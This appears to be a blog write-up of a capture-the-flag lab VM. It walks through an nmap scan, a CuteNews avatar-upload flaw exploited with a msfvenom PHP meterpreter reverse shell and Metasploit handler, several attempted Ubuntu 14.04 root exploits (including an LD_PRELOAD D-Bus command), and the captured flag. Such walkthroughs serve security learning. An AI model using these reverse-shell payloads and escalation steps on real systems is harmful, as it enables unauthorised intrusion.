As droopy was not really hard and doesn't contain as much web vulnerability as I
would hope for, I tried an other VM
[SecTalks: BNE0x03 - Simple](https://www.vulnhub.com/entry/sectalks-bne0x03-simple,141/)
There were also hints on the description of the machine but with my resolution
they do not appear when just browsing the main page of vulnhub so I have not
spoiled myself with the hints this time.

<!-- PELICAN_END_SUMMARY -->

## Discovery

Let's nmap the box to get some knowledge about it:

    root@kalili:~# nmap 10.0.2.5 -p0-65535

    Starting Nmap 7.12 ( https://nmap.org ) at 2016-05-11 15:42 CEST
    Nmap scan report for 10.0.2.5
    Host is up (0.00032s latency).
    Not shown: 65535 closed ports
    PORT   STATE SERVICE
    80/tcp open  http
    MAC Address: 08:00:27:60:21:5C (Oracle VirtualBox virtual NIC)

    Nmap done: 1 IP address (1 host up) scanned in 2.60 seconds

There seems once more that only the port 80 with a HTTP service is available.

## Web

We go to the website. We notice that it is powered by CuteNews 2.0.3 (look at
the footer). We search on internet for vulnerability and found
[one](https://www.exploit-db.com/exploits/37474/).
This vulnerability allow the execute PHP code by uploading a malicious avatar.

![Simple homepage](/media/2016.05/simple1.png){: .image-process-article-image}

We create an account in order to upload our avatar.

![Simple account page](/media/2016.05/simple2.png){: .image-process-article-image}

We generate a PHP meterpreter using `msfvenom`:

    msfvenom -p php/meterpreter/reverse_tcp LHOST=10.0.2.15 LPORT=4444 -e php/base64 -f raw > /tmp/shell.php

We prepare our metasploit for the callback:

    msf > use exploit/multi/handler
    msf exploit(handler) > set payload php/meterpreter/reverse_tcp
    payload => php/meterpreter/reverse_tcp
    msf exploit(handler) > set LHOST 10.0.2.5
    LHOST => 10.0.2.5
    msf exploit(handler) > set LPORT 4444
    LPORT => 4444
    msf exploit(handler) > exploit
    [*] Started reverse handler on 10.0.2.5:4444
    [*] Starting the payload handler...

We upload our msfvenom's payload as our avatar.

We go to `http://10.0.2.5/uploads/avatar_john_shell.php` and we got our
meterpreter!
Let's see what this box is made of:

    uname -a
    Linux simple 3.16.0-30-generic #40~14.04.1-Ubuntu SMP Thu Jan 15 17:45:15 UTC 2015 i686 i686 i686 GNU/Linux

Once more an Ubuntu 14.04, like the droopy from yesterday.

## Privileges escalation

### CVE-2015-1328 exploiting overlayFS

Let us try once again to exploit the CVE-2015-1328 exploiting overlayFS to get
a root shell on the machine. I started a shell from the meterpreter, download
the exploit, compile it, run it and failed it:

    meterpreter > shell
    Process 1335 created.
    Channel 3 created.

When searching for exploit regarding linux 3.16.0 I found the CVE-2014-5207:

### CVE-2014-5207 Fuse-based exploit

[CVE-2014-5207 Fuse-based exploit](https://www.exploit-db.com/exploits/34923/).
I download the exploit, compiled it and once more failed it:

    :::text
    gcc -Wall fuse_suid.c `pkg-config fuse --cflags --libs` -o fuse_suid
    /bin/sh: 1: pkg-config: not found
    fuse_suid.c:21:18: fatal error: fuse.h: No such file or directory
    #include <fuse.h>
                      ^
    compilation terminated

When searching for `ubuntu 14.04 privilege escalation exploit` I found two
interesting exploits :
 * CVE-2015-3643
 * CVE-2015-1318 + CVE-2015-1862

### CVE-2015-3643

[The CVE-2015-3643](https://www.exploit-db.com/exploits/36820/) exploit the
D-Bus listening on com.ubuntu.USBCreator.
I try this exploit but the module was not available and failed:

    dbus-send --print-reply --system --dest=com.ubuntu.USBCreator /com/ubuntu/USBCreator com.ubuntu.USBCreator.KVMTest string:/dev/sda dict:string:string:DISPLAY,"foo",XAUTHORITY,"foo",LD_PRELOAD,"/tmp/test.so"
    Error org.freedesktop.DBus.Error.ServiceUnknown: The name com.ubuntu.USBCreator was not provided by any .service files

### CVE-2015-1318 + CVE-2015-1862

[The CVE-2015-1318 + CVE-2015-1862](https://www.exploit-db.com/exploits/36746/)
exploit a feature in ubuntu 14.04 allowing a user to forward crash reports.

I download the exploit, compiled it with `-static` and run it to get a root
shell on the box:

    meterpreter > shell
    Process 1550 created.
    Channel 9 created.
    cd /tmp/

## Conclusion

We just need to get our hands on the flag to finish it.

    cat /root/flag.txt
    U wyn teh Interwebs!!1eleven11!!1!
    Hack the planet

It was a nice box with still not so much web exploitation and only one exploit
to launch to get to root.
Thanks to [Robert Winkel](https://twitter.com/@RobertWinkel) for the box and as
always to Vulnhub for their work.
